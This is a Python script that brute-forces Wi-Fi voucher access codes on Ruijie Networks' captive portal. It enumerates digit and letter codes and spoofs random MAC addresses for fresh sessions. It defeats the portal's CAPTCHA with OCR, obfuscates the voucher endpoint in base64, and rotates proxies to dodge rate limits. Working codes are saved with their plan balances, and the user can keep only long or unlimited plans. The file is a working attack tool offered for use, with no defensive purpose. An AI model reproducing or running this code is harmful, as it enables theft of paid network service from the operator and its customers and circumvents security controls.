#!/usr/bin/env python3
# damm bro ကြိုက်သလိုပြောင်းသုံးစိတ်မဆိုးဘူး😘
# Devloper Mycopy

import re
import json
import base64
import random
import string
import time
import asyncio
import aiohttp
import cv2
import ddddocr
import numpy as np
from datetime import datetime
import os
import sys
import gc
import itertools

# ── CONFIGURATION ──────────────────────────────────────────────────────────
BATCH_SIZE = 1250  #<---------ဒီနေရာတွေကြိုက်သလိုပြောင်းလို့ရတယ်|အပြင်လွန်ရင်လစ်မယ်နော်😒|
MAX_CONCURRENT = 260 #<--------------5:1
CONNECTION_LIMIT = 500
PROXY_FILE = "proxies.txt"
RESULT_FILE = "scan_results.txt"
CONFIG_FILE = "config.json"

# ── GLOBALS ──────────────────────────────────────────────────────────────
session = None
_connector = None
SUCCESS_CODES = []
LIMITED_CODES = []
session_url = None
scan_running = False
scan_stop = False
use_proxy = False
proxies = []
current_proxy_index = 0
_ocr = None
DIGITS = list(string.digits)
LOWERCASE_CHARS = list(string.ascii_lowercase)
MIXED_CHARS = list(string.ascii_lowercase + string.digits)

# ── COLORS ──────────────────────────────────────────────────────────────
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    END = '\033[0m'

def cprint(text, color="white", bold=False):
    colors = {"red": Colors.RED, "green": Colors.GREEN, "yellow": Colors.YELLOW,
              "blue": Colors.BLUE, "cyan": Colors.CYAN, "magenta": Colors.MAGENTA}
    prefix = colors.get(color, "")
    if bold:
        prefix += Colors.BOLD
    print(f"{prefix}{text}{Colors.END}")

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    print(f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════╗
    🔥 RUIJIE EXTREME SCANNER - PROJECT X                
    ⚡ 6,7,8,9 Digit | 6,7,8 Lower | Mixed 6,7,8 (a-z+0-9)        
    👤 Devloper @Arrowdemon 2006                   

╚══════════════════════════════════════════════════════════════════╝{Colors.END}
    """)

def format_time(seconds):
    if seconds == float('inf') or seconds <= 0:
        return "N/A"
    if seconds > 86400:
        return f"{int(seconds/86400)}d {int((seconds%86400)/3600)}h"
    elif seconds > 3600:
        return f"{int(seconds/3600)}h {int((seconds%3600)/60)}m"
    elif seconds > 60:
        return f"{int(seconds/60)}m {int(seconds%60)}s"
    return f"{int(seconds)}s"

# ── PLAN FILTER ──────────────────────────────────────────────────────────

def plan_to_minutes(s):
    if not s:
        return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|d|h|m)\b', s):
        val = int(val)
        if unit == 'mo':
            total += val * 30 * 24 * 60
        elif unit == 'd':
            total += val * 24 * 60
        elif unit == 'h':
            total += val * 60
        elif unit == 'm':
            total += val
    return total

# ── GENERATORS ──────────────────────────────────────────────────────────

def iter_lowercase(length=6):
    chars = LOWERCASE_CHARS
    common = ['admin', 'guest', 'user', 'pass', 'test', 'login', 'root', 'wifi']
    for word in common:
        if len(word) <= length:
            padded = word.ljust(length, 'a')
            if len(padded) == length:
                yield padded
    while True:
        yield ''.join(random.choice(chars) for _ in range(length))

def iter_mixed(length=6):
    chars = MIXED_CHARS
    while True:
        yield ''.join(random.choice(chars) for _ in range(length))

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def iter_digit_codes(mode, start_digit=None):
    if mode in ["6", "7", "8", "9"]:
        length = int(mode)
        
        if mode in ["6", "7"]:
            if start_digit is not None:
                start = int(start_digit) * (10 ** (length - 1))
                end = (int(start_digit) + 1) * (10 ** (length - 1))
                for i in range(start, end):
                    yield str(i).zfill(length)
                return
            else:
                codes = [str(i).zfill(length) for i in range(10 ** length)]
                random.shuffle(codes)
                yield from codes
                return
        
        # 8 Digit: 0 - 99,999,999
        if mode == "8":
            # Generate chunks for memory efficiency
            ranges = list(range(0, 100, 10))
            random.shuffle(ranges)
            for start_range in ranges:
                start = start_range * 1000000
                end = (start_range + 10) * 1000000
                chunk_codes = [str(i).zfill(8) for i in range(start, end)]
                random.shuffle(chunk_codes)
                yield from chunk_codes
                gc.collect()
        
        # 9 Digit: 0 - 999,999,999
        elif mode == "9":
            ranges = list(range(0, 1000, 10))
            random.shuffle(ranges)
            for start_range in ranges:
                start = start_range * 1000000
                end = (start_range + 10) * 1000000
                chunk_codes = [str(i).zfill(9) for i in range(start, end)]
                random.shuffle(chunk_codes)
                yield from chunk_codes
                gc.collect()
    
    raise ValueError(f"Unsupported digit mode: {mode}")

def iter_codes(mode, start_digit=None):
    if mode.startswith("mixed"):
        length = int(mode.replace("mixed", ""))
        return iter_mixed(length)
    elif mode.startswith("lower"):
        length = int(mode.replace("lower", ""))
        return iter_lowercase(length)
    elif mode in ["6", "7", "8", "9"]:
        return iter_digit_codes(mode, start_digit)
    else:
        raise ValueError(f"Unsupported mode: {mode}")

# ── CAPTCHA FUNCTIONS ────────────────────────────────────────────────────

def get_mac():
    return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
        if img is None:
            return None
        _, buffer = cv2.imencode('.png', img)
        return _ocr.classification(buffer.tobytes()).upper()
    except:
        return None

async def get_session_id(session_obj, session_url, prev_sid=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
        'accept': 'text/html',
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True, timeout=5) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else prev_sid
    except:
        return prev_sid

async def Captcha_Image(session_obj, session_id):
    params = {'sessionId': session_id, '_t': str(time.time())}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36'}
    try:
        async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image',
                                   params=params, headers=headers, timeout=5) as req:
            return await req.read()
    except:
        return None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Varify_Captcha(session_obj, session_id, text):
    json_data = {'sessionId': session_id, 'authCode': text}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
               'content-type': 'application/json'}
    try:
        async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
                                   headers=headers, json=json_data, timeout=5) as req:
            data = await req.json()
            return session_id if data.get("success") else None
    except:
        return None

# ── FIXED BALANCE CHECKER ───────────────────────────────────────────────

async def get_balance_info(session_id):
    """
    FIXED: Get balance info with proper parsing
    Returns: (display_string, minutes, plan_name)
    """
    endpoints = [
        f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}",
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}",
        f"https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{session_id}",
    ]
    
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
    }
    
    async with aiohttp.ClientSession() as temp_session:
        for url in endpoints:
            try:
                async with temp_session.get(url, headers=headers, timeout=8) as resp:
                    if resp.status != 200:
                        continue
                    
                    data = await resp.json()
                    
                    # Check response structure
                    if not data.get("success", False):
                        continue
                    
                    # Get result/data
                    result = data.get("result", {})
                    if not result:
                        result = data.get("data", {})
                    
                    # Try multiple keys for minutes
                    minutes = None
                    for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 
                               'leftMinutes', 'balance', 'remaining', 'total', 'time']:
                        if key in result and result[key] is not None:
                            minutes = result[key]
                            break
                    
                    if minutes is None:
                        continue
                    
                    # Get plan name
                    plan_name = result.get("profileName") or result.get("planName") or "Unknown"
                    
                    # Get expiry if available
                    expiry = result.get("expireTime") or result.get("expiryTime") or None
                    
                    mins_float = float(minutes)
                    
                    # ── Format Balance Display ──
                    if mins_float <= 0:
                        display = "⏳ Expired"
                        balance_minutes = 0
                    elif mins_float >= 999999:
                        display = "♾️ Unlimited"
                        balance_minutes = float('inf')
                    else:
                        balance_minutes = mins_float
                        total_secs = mins_float * 60
                        
                        if total_secs > 86400:
                            days = int(total_secs / 86400)
                            hours = int((total_secs % 86400) / 3600)
                            mins = int((total_secs % 3600) / 60)
                            display = f"⏱ {days}d {hours}h {mins}m"
                        elif total_secs > 3600:
                            hours = int(total_secs / 3600)
                            mins = int((total_secs % 3600) / 60)
                            display = f"⏱ {hours}h {mins}m"
                        elif total_secs > 60:
                            display = f"⏱ {int(mins_float)}m"
                        else:
                            display = f"⏱ {int(total_secs)}s"
                    
                    # Final display
                    final_display = f"📋 {plan_name} | {display}"
                    return (final_display, balance_minutes, plan_name)
                    
            except json.JSONDecodeError:
                continue
            except Exception as e:
                continue
    
    return ("📋 Unknown | ⏱ N/A", 0, "Unknown")

# ── PROXY FUNCTIONS ──────────────────────────────────────────────────────

def load_proxies():
    global proxies
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
            return True
    except:
        pass
    return False

def get_next_proxy():
    global current_proxy_index
    if not proxies:
        return None
    proxy = proxies[current_proxy_index]
    current_proxy_index = (current_proxy_index + 1) % len(proxies)
    return proxy

# ── SAVE FUNCTIONS ──────────────────────────────────────────────────────

def save_config():
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump({"session_url": session_url}, f)
    except:
        pass

def load_config():
    global session_url
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                session_url = config.get("session_url")
                return bool(session_url)
    except:
        pass
    return False

def save_results():
    try:
        with open(RESULT_FILE, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write(f"SCAN RESULTS - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            for i, code in enumerate(SUCCESS_CODES, 1):
                f.write(f"{i}. {code.get('code', 'N/A')} | {code.get('plan', 'N/A')} | {code.get('balance', 'N/A')}\n")
            f.write(f"\nTotal: {len(SUCCESS_CODES)} codes\n")
    except:
        pass

# ── PERFORM CHECK ──────────────────────────────────────────────────────

async def perform_check_silent(code, plan_filters=None, use_proxy=False, session_id_cache=None):
    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()
    
    session_id = session_id_cache
    proxy = get_next_proxy() if use_proxy and proxies else None
    if proxy:
        proxy = f"http://{proxy}"
    
    timeout = aiohttp.ClientTimeout(total=10, connect=3)
    
    try:
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            if not session_id:
                session_id = await get_session_id(task_session, session_url)
                if not session_id:
                    return None
            
            image = await Captcha_Image(task_session, session_id)
            if not image:
                return None
            text = await Captcha_Text(image)
            if not text:
                return None
            if not await Varify_Captcha(task_session, session_id, text):
                return None
            
            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": text,
            }
            headers = {
                "user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36",
                "content-type": "application/json",
                "accept": "*/*",
            }
            
            try:
                async with task_session.post(post_url, json=data, headers=headers, proxy=proxy, timeout=8) as req:
                    response = await req.text()
                    
                    if 'request limited' in response:
                        return None
                    
                    if 'logonUrl' in response:
                        # Get balance info
                        balance_display, balance_minutes, plan_name = await get_balance_info(session_id)
                        
                        # Apply plan filter
                        if plan_filters:
                            matched = False
                            for filter_plan in plan_filters:
                                filter_minutes = plan_to_minutes(filter_plan)
                                if filter_plan.lower() in ('unlimit', 'unlimited'):
                                    if balance_minutes == float('inf'):
                                        matched = True
                                        break
                                elif balance_minutes >= filter_minutes:
                                    matched = True
                                    break
                            if not matched:
                                return None
                        
                        return {
                            "code": code,
                            "plan": plan_name,
                            "balance": balance_display,
                            "minutes": balance_minutes,
                            "session_id": session_id
                        }
                    elif 'STA' in response:
                        return {"code": code, "status": "limited"}
            except:
                return None
    except:
        return None
    
    return None

# ── LIVE DISPLAY ──────────────────────────────────────────────────────────

scan_start_time = 0

def format_progress_live(checked, total=None, speed=0, found=0, codes=None):
    speed_str = f"{speed:,.0f}/min"
    elapsed = time.monotonic() - scan_start_time if 'scan_start_time' in globals() else 0
    
    if total is not None and total > 0:
        bar_length = 30
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / (100 / bar_length)))
        bar = "█" * filled + "░" * (bar_length - filled)
        
        lines = [
            f"\n  {Colors.CYAN}📊 Progress: {percent:.2f}% [{bar}]{Colors.END}",
            f"  {Colors.GREEN}⚡ SPEED: {speed_str}{Colors.END}",
            f"  {Colors.YELLOW}📦 Checked: {checked:,} / {total:,}{Colors.END}",
            f"  {Colors.MAGENTA}✅ Found: {found}{Colors.END}",
            f"  {Colors.BLUE}⏱ Time: {format_time(elapsed)}{Colors.END}"
        ]
    else:
        lines = [
            f"\n  {Colors.CYAN}📊 Progress: Random Mode (Infinite){Colors.END}",
            f"  {Colors.GREEN}⚡ SPEED: {speed_str}{Colors.END}",
            f"  {Colors.YELLOW}📦 Checked: {checked:,}{Colors.END}",
            f"  {Colors.MAGENTA}✅ Found: {found}{Colors.END}",
            f"  {Colors.BLUE}⏱ Time: {format_time(elapsed)}{Colors.END}"
        ]
    
    if codes:
        lines.append(f"\n  {Colors.GREEN}🔥 Latest {min(10, len(codes))} Codes:{Colors.END}")
        for i, code in enumerate(codes[-10:], 1):
            balance = code.get('balance', 'N/A')
            if len(balance) > 30:
                balance = balance[:27] + "..."
            lines.append(f"    {i:2}. {Colors.CYAN}{code['code']}{Colors.END} | {Colors.YELLOW}{balance}{Colors.END}")
    
    return "\n".join(lines)

# ── MAIN SCAN LOOP ──────────────────────────────────────────────────────

async def run_scan(mode, start_digit=None, target=None, plan_filters=None, use_proxy=False):
    global scan_running, scan_stop, SUCCESS_CODES, LIMITED_CODES, scan_start_time
    
    try:
        if mode.startswith("mixed"):
            length = int(mode.replace("mixed", ""))
            code_iter = iter_mixed(length)
            total = None
            mode_label = f"Mixed {length} (a-z+0-9)"
        elif mode.startswith("lower"):
            length = int(mode.replace("lower", ""))
            code_iter = iter_lowercase(length)
            total = None
            mode_label = f"{length}-letter lowercase"
        else:
            code_iter = iter_digit_codes(mode, start_digit)
            if mode in ["6", "7"]:
                total = 10 ** int(mode)
            elif mode == "8":
                total = 100000000
            elif mode == "9":
                total = 1000000000
            else:
                total = None
            mode_label = f"{mode}-digit"
    except ValueError as e:
        cprint(f"  ✗ Error: {e}", "red")
        return
    
    checked = 0
    found = 0
    scan_start_time = time.monotonic()
    scan_running = True
    scan_stop = False
    
    filter_note = f" | Filter: {' / '.join(plan_filters)}" if plan_filters else ""
    
    cprint(f"\n  🚀 STARTING SCAN", "cyan", bold=True)
    cprint(f"  📊 Mode: {mode_label}{filter_note}", "yellow")
    if start_digit is not None:
        cprint(f"  🔢 Start Digit: {start_digit}", "yellow")
    if total:
        cprint(f"  📊 Total: {total:,} combinations", "magenta")
    cprint(f"  ⚡ Batch: {BATCH_SIZE} | Concurrent: {MAX_CONCURRENT}", "cyan")
    print("  " + "=" * 80)
    
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    session_cache = None
    
    async def _check(code):
        nonlocal session_cache
        async with sem:
            result = await perform_check_silent(code, plan_filters, use_proxy, session_cache)
            if result and result.get("session_id"):
                session_cache = result.get("session_id")
            return result

    try:
        while True:
            if scan_stop:
                cprint("\n  ⏹️ Stopped by user", "yellow")
                break
            
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break
            
            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            
            for result in results:
                if isinstance(result, Exception):
                    continue
                if result is None:
                    continue
                if result.get("status") == "limited":
                    LIMITED_CODES.append(result["code"])
                elif result.get("code"):
                    SUCCESS_CODES.append(result)
                    found += 1
                    
                    save_results()
                    
                    if target and found >= target:
                        cprint(f"\n  🎯 TARGET REACHED! {found} codes", "green", bold=True)
                        scan_running = False
                        return
            
            checked += len(batch)
            
            elapsed = time.monotonic() - scan_start_time
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            
            clear_screen()
            print_banner()
            
            progress_text = format_progress_live(checked, total, speed, found, SUCCESS_CODES)
            print(progress_text)
            
            print(f"\n  {Colors.CYAN}📡 Mode: {mode_label}{Colors.END}")
            print(f"  {Colors.CYAN}🌐 Proxy: {'ON' if use_proxy else 'OFF'}{Colors.END}")
            print(f"  {Colors.CYAN}📋 Filter: {' / '.join(plan_filters) if plan_filters else 'None'}{Colors.END}")
            print("  " + "=" * 80)
            
            if checked % 5000 == 0:
                save_results()
                gc.collect()
    
    except KeyboardInterrupt:
        cprint("\n  ⏹️ Interrupted", "yellow")
    except Exception as e:
        cprint(f"\n  ✗ Error: {e}", "red")
    finally:
        scan_running = False
        save_results()
        
        clear_screen()
        print_banner()
        elapsed = time.monotonic() - scan_start_time
        avg_speed = (checked / elapsed * 60) if elapsed > 0 else 0
        cprint(f"\n  ✅ COMPLETE! Found {found} codes", "green", bold=True)
        cprint(f"  ⚡ Avg Speed: {avg_speed:.0f}/min | Time: {format_time(elapsed)}", "cyan")
        
        if SUCCESS_CODES:
            cprint(f"\n  📋 All Found Codes:", "green", bold=True)
            print("  " + "=" * 80)
            print(f"  {'#':<4} {'CODE':<12} {'BALANCE':<50}")
            print("  " + "=" * 80)
            for i, code in enumerate(SUCCESS_CODES, 1):
                balance = code.get('balance', 'N/A')
                if len(balance) > 48:
                    balance = balance[:45] + "..."
                cprint(f"  {i:<4} {code['code']:<12} {balance:<50}", "yellow")
            print("  " + "=" * 80)

# ── SELECT MODE ──────────────────────────────────────────────────────────

def select_mode():
    clear_screen()
    print_banner()
    
    cprint("\n  🔢 Select Scan Mode:", "cyan", bold=True)
    print("  " + "=" * 80)
    print("  [DIGIT MODES]")
    print("  1. 6-digit (000000-999999)")
    print("  2. 7-digit (0000000-9999999)")
    print("  3. 8-digit (00000000-99999999) ")
    print("  4. 9-digit (000000000-999999999)  ")
    print("  [LOWERCASE MODES]")
    print("  5. 6-letter (a-z)")
    print("  6. 7-letter (a-z)")
    print("  7. 8-letter (a-z)")
    print("  [MIXED MODES - a-z + 0-9]")
    print("  8. Mixed 6 (a-z + 0-9)")
    print("  9. Mixed 7 (a-z + 0-9)")
    print("  10. Mixed 8 (a-z + 0-9)")
    print("  " + "=" * 80)
    
    choice = input("\n  > ").strip()
    
    modes = {
        "1": "6", "2": "7", "3": "8", "4": "9",
        "5": "lower6", "6": "lower7", "7": "lower8",
        "8": "mixed6", "9": "mixed7", "10": "mixed8"
    }
    
    if choice not in modes:
        cprint("  ❌ Invalid choice!", "red")
        return None, None
    
    mode = modes[choice]
    
    if mode in ["6", "7", "8", "9"]:
        clear_screen()
        print_banner()
        cprint(f"\n  🔢 Selected Mode: {mode}-digit", "cyan", bold=True)
        
        if mode == "8":
            cprint(f"  📊 FULL RANGE: 00000000 to 99999999 (100M combos)", "yellow")
        elif mode == "9":
            cprint(f"  📊 FULL RANGE: 000000000 to 999999999 (1B combos)", "yellow")
        
        print("\n  " + "=" * 80)
        print("  Select START DIGIT (0-9) or RANDOM:")
        print("  " + "=" * 80)
        print("   0   1   2   3   4   5   6   7   8   9")
        print("  " + "=" * 80)
        print("   r - Random (Recommended)")
        print("  " + "=" * 80)
        
        digit_choice = input("\n  > ").strip().lower()
        
        if digit_choice == "r":
            start_digit = None
            cprint(f"\n  ✅ Mode: {mode}-digit | Start: Random", "green")
        elif digit_choice in [str(i) for i in range(10)]:
            start_digit = digit_choice
            cprint(f"\n  ✅ Mode: {mode}-digit | Start: {start_digit}", "green")
        else:
            cprint("  ❌ Invalid! Using Random", "yellow")
            start_digit = None
        return mode, start_digit
    
    if mode.startswith("mixed"):
        length = int(mode.replace("mixed", ""))
        cprint(f"\n  ✅ Mode: Mixed {length} (a-z + 0-9)", "green", bold=True)
    else:
        length = int(mode.replace("lower", ""))
        cprint(f"\n  ✅ Mode: {length}-letter lowercase (a-z)", "green")
    
    return mode, None

# ── SELECT PLAN FILTER ─────────────────────────────────────────────────

def select_plan_filter():
    clear_screen()
    print_banner()
    
    cprint("\n  📋 Select Plan Filter (optional):", "cyan", bold=True)
    print("  " + "=" * 80)
    print("  Filter codes by minimum duration:")
    print("  " + "=" * 80)
    print("  1. No filter (show all)")
    print("  2. 1 day (1d)")
    print("  3. 7 days (7d)")
    print("  4. 1 month (1mo)")
    print("  5. Unlimited only")
    print("  6. Custom (e.g., 2h, 30min, 1d 2h)")
    print("  " + "=" * 80)
    
    choice = input("\n  > ").strip()
    
    plan_map = {
        "1": None,
        "2": ["1d"],
        "3": ["7d"],
        "4": ["1mo"],
        "5": ["unlimited"]
    }
    
    if choice in plan_map:
        return plan_map[choice]
    elif choice == "6":
        cprint("\n  Enter custom plan:", "yellow")
        custom = input("  > ").strip()
        if custom:
            return [custom]
    return None

# ── MAIN MENU ────────────────────────────────────────────────────────────

async def main():
    global session_url, session, _connector, use_proxy
    global SUCCESS_CODES, LIMITED_CODES
    
    clear_screen()
    print_banner()
    
    # Input URL
    cprint("\n  🔑 Enter Portal URL:", "yellow")
    cprint("  📝 Example: https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00", "cyan")
    session_url = input("\n  > ").strip()
    
    while not session_url:
        cprint("  ❌ Cannot be empty!", "red")
        session_url = input("  > ").strip()
    
    if "mac=" not in session_url:
        cprint("  ⚠️ URL may not contain 'mac=' parameter", "yellow")
        cprint("  🔧 Add mac parameter? (y/n):", "yellow")
        if input("  > ").strip().lower() == "y":
            if "?" in session_url:
                session_url += "&mac=02:00:00:00:00:00"
            else:
                session_url += "?mac=02:00:00:00:00:00"
            cprint(f"  ✅ Updated URL", "green")
    
    save_config()
    
    if os.path.exists(PROXY_FILE):
        if load_proxies():
            cprint(f"  🌐 Loaded {len(proxies)} proxies", "green")
            use_proxy = True
    
    _connector = aiohttp.TCPConnector(
        limit=CONNECTION_LIMIT,
        ttl_dns_cache=600,
        enable_cleanup_closed=False
    )
    session = aiohttp.ClientSession(
        connector=_connector,
        connector_owner=False
    )
    
    try:
        while True:
            clear_screen()
            print_banner()
            
            cprint(f"\n  📡 URL: {session_url[:50]}...", "cyan")
            cprint(f"  📊 Found: {len(SUCCESS_CODES)} codes", "green")
            cprint(f"  🌐 Proxy: {'ON' if use_proxy else 'OFF'}", "yellow")
            
            print("\n  " + "=" * 80)
            print("  1. Start Scan (Select Mode + Plan Filter)")
            print("  2. View Found Codes")
            print("  3. Toggle Proxy")
            print("  4. Clear Codes")
            print("  5. Change URL")
            print("  6. Exit")
            print("  " + "=" * 80)
            
            choice = input("\n  > ").strip()
            
            if choice == "1":
                if not session_url:
                    cprint("  ❌ Please set URL first!", "red")
                    input("\n  Press Enter...")
                    continue
                
                mode, start_digit = select_mode()
                if mode is None:
                    continue
                
                plan_filters = select_plan_filter()
                
                clear_screen()
                print_banner()
                cprint(f"\n  📡 URL: {session_url[:50]}...", "cyan")
                cprint(f"  🔢 Mode: {mode}", "yellow")
                if start_digit is not None:
                    cprint(f"  🔢 Start Digit: {start_digit}", "yellow")
                if plan_filters:
                    cprint(f"  📋 Plan Filter: {' / '.join(plan_filters)}", "magenta")
                else:
                    cprint(f"  📋 Plan Filter: None (show all)", "magenta")
                cprint(f"  🌐 Proxy: {'ON' if use_proxy else 'OFF'}", "yellow")
                
                target_str = input("\n  Target count (Enter for unlimited): ").strip()
                target = int(target_str) if target_str.isdigit() else None
                
                await run_scan(mode, start_digit, target, plan_filters, use_proxy)
                input("\n  Press Enter...")
                
            elif choice == "2":
                clear_screen()
                print_banner()
                if SUCCESS_CODES:
                    cprint(f"\n  📋 Found {len(SUCCESS_CODES)} codes:", "green", bold=True)
                    print("  " + "=" * 80)
                    print(f"  {'#':<4} {'CODE':<12} {'BALANCE':<50}")
                    print("  " + "=" * 80)
                    for i, code in enumerate(SUCCESS_CODES, 1):
                        balance = code.get('balance', 'N/A')
                        if len(balance) > 48:
                            balance = balance[:45] + "..."
                        cprint(f"  {i:<4} {code['code']:<12} {balance:<50}", "yellow")
                    print("  " + "=" * 80)
                else:
                    cprint("  📭 No codes found", "yellow")
                input("\n  Press Enter...")
                
            elif choice == "3":
                use_proxy = not use_proxy
                if use_proxy and not proxies:
                    cprint("  ❌ No proxies found", "red")
                    use_proxy = False
                else:
                    cprint(f"  ✅ Proxy: {'ON' if use_proxy else 'OFF'}", "green")
                await asyncio.sleep(1)
                
            elif choice == "4":
                SUCCESS_CODES = []
                LIMITED_CODES = []
                if os.path.exists(RESULT_FILE):
                    os.remove(RESULT_FILE)
                cprint("  ✅ Codes cleared", "green")
                await asyncio.sleep(1)
                
            elif choice == "5":
                clear_screen()
                print_banner()
                cprint("\n  🔑 Enter New Portal URL:", "yellow")
                cprint(f"  📝 Current: {session_url[:60]}...", "cyan")
                new_url = input("\n  > ").strip()
                if new_url:
                    session_url = new_url
                    save_config()
                    cprint("  ✅ URL updated!", "green")
                else:
                    cprint("  ❌ Cannot be empty!", "red")
                input("\n  Press Enter...")
                
            elif choice == "6":
                cprint("\n  👋 Goodbye!", "cyan")
                break
                
    except KeyboardInterrupt:
        cprint("\n  👋 Goodbye!", "cyan")
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        cprint("\n👋 Goodbye!", "cyan")
